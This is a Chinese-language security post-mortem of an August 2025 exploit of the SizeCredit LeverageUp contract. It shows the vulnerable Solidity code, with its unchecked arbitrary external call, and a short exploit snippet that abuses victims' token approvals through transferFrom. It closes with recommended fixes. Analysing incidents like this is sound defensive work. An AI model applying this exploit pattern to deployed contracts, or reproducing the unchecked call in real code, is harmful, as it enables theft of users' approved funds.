# SizeCredit Hack 根因分析报告

## 📊 执行摘要

- **项目名称**: SizeCredit (LeverageUp)
- **攻击日期**: 2025年8月15日
- **网络环境**: Ethereum Mainnet
- **总损失金额**: $19,700 USD
- **攻击类型**: 访问控制缺陷 + 任意外部调用
- **漏洞级别**: 🔴 严重

## 🎯 攻击概览

| 角色 | 地址 |
|------|------|
| 攻击者 | `0xa7e9b982b0e19a399bc737ca5346ef0ef12046da` |
| 攻击合约 | `0xa6dc1fc33c03513a762cdf2810f163b9b0fd3a71` |
| 受害合约 | `0xf4a21ac7e51d17a0e1c8b59f7a98bb7a97806f14` |
| 受害用户 | `0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290` |
| 被盗代币 | PT-WSTUSR (`0x23E60d1488525bf4685f53b3aa8E676c30321066`) |

- **攻击交易**: [`0xc7477d6a5c63b04d37a39038a28b4cbaa06beb167e390d55ad4a421dbe4067f8`](https://etherscan.io/tx/0xc7477d6a5c63b04d37a39038a28b4cbaa06beb167e390d55ad4a421dbe4067f8)
- Twitter: https://x.com/SuplabsYi/status/1956306748073230785

## 🔍 漏洞分类

- **主要**: 任意外部调用 (Arbitrary External Call via Swap Data)
- **次要**: 输入验证缺失 (Lack of Input Validation)
- **CWE-20**: Improper Input Validation

## 💻 技术分析

### 4.1 漏洞代码分析

```solidity
interface ILeverageUp {
    function leverageUpWithSwap(
        address size,
        SellCreditMarketParams[] memory sellCreditMarketParamsArray,
        address tokenIn,
        uint256 amount,
        uint256 leveragePercent,
        uint256 borrowPercent,
        SwapParams[] memory swapParamsArray  // 🚨 不受限制的swap参数
    ) external;
}

// leverageUpWithSwap内部：
function leverageUpWithSwap(..., SwapParams[] memory swapParamsArray) external {
    for (uint256 i = 0; i < swapParamsArray.length; i++) {
        SwapParams memory params = swapParamsArray[i];
        
        if (params.method == SwapMethod.GenericRoute) {
            // 🚨 解码并执行任意调用
            (uint256 offset, address target, address recipient, bytes memory data) = 
                abi.decode(params.data, (uint256, address, address, bytes));
            
            // ❌ 没有验证target是否可信
            // ❌ 没有验证data的内容
            (bool success,) = target.call(data);
        }
    }
}
```

**核心漏洞**：`leverageUpWithSwap`允许通过`swapParams.data`执行任意外部调用，攻击者构造data让合约调用`PT_WSTUSR.transferFrom(victim, attacker, amount)`。

### 4.2 攻击流程

**步骤1: 发现已授权用户**
- 受害者已授权LeverageUp合约

**步骤2: 构造恶意SwapParams**
```solidity
// 内层：transferFrom调用
bytes memory inner = abi.encodeWithSelector(
    IERC20.transferFrom.selector,
    VICTIM,          // from
    address(this),   // to
    amount           // 受害者的全部余额
);

// 外层：GenericRoute参数
bytes memory data = abi.encode(
    32,              // offset
    PT_WSTUSR,       // target = 代币合约
    address(this),   // recipient
    inner            // transferFrom的calldata
);

// 🔥 关键技巧：修改data的第127字节
data[127] = hex"60";  // 将0x80改为0x60，可能是为了绕过某个检查

SwapParams memory swapParams = SwapParams({
    method: SwapMethod.GenericRoute,
    data: data
});
```

**步骤3: 调用leverageUpWithSwap**
- 合约执行PT_WSTUSR.transferFrom(victim, attacker, amount)
- 利用victim的授权窃取资金

## 🎯 根本原因

### 为什么导致Hack？

**代码缺陷**：
```solidity
// ❌ 缺少验证
function executeSwap(SwapParams memory params) internal {
    (,address target,, bytes memory data) = abi.decode(params.data, ...);
    target.call(data);  // 任意调用！
}

// ✅ 应该添加
require(whitelistedTargets[target], "Untrusted target");
bytes4 selector = bytes4(data);
require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
```

**利用链路**：
1. 受害者授权LeverageUp（正常使用）
2. 攻击者构造恶意swapParams
3. LeverageUp执行transferFrom
4. 资金从受害者转到攻击者

### 为什么能发现？

- DEX聚合器的通病：任意外部调用
- 监控Approval事件找到目标
- GenericRoute功能过于灵活

### 如何修复？

```solidity
// 1. 白名单target地址
// 2. 禁止调用transferFrom
// 3. 验证调用者权限
// 4. 限制data内容
// 5. 使用Permit2避免预授权
```

## 📝 总结

SizeCredit攻击利用`leverageUpWithSwap`的GenericRoute功能缺少输入验证，构造恶意swapParams让合约执行`transferFrom`，窃取已授权用户的$19.7k代币。这是又一个DEX聚合器任意外部调用的典型案例。

**关键教训**: 
- ⚠️ GenericRoute等灵活功能必须严格限制
- ⚠️ 禁止执行transferFrom
- ⚠️ 白名单target和selector

---
**报告生成时间**: 2025-10-12  
**分析者**: DeFiHackLabs Security Team  
**版本**: 1.0

